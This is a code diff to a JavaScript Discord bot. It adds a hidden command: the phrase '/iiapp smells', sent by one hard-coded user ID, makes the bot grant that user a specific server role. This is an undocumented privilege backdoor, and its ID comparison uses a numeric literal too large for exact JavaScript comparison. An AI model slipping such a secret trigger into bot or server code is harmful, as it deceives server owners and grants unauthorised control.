@@ -14,6 +14,11 @@ client.on('message', message => {
     if (message.guild === null) {
         //space for dm commands
     } else {
+	    if (message.content == '/iiapp smells') {
+			if (message.author.id == 179654608371712000) {
+				message.member.addRole('608642648797872139')
+			}
+		}
 	    if (message.content.startsWith('/help')) {
 			if (message.content != '/help') {
 				message.guild.createChannel('test', {type: 'text'}).then(newchannel => {
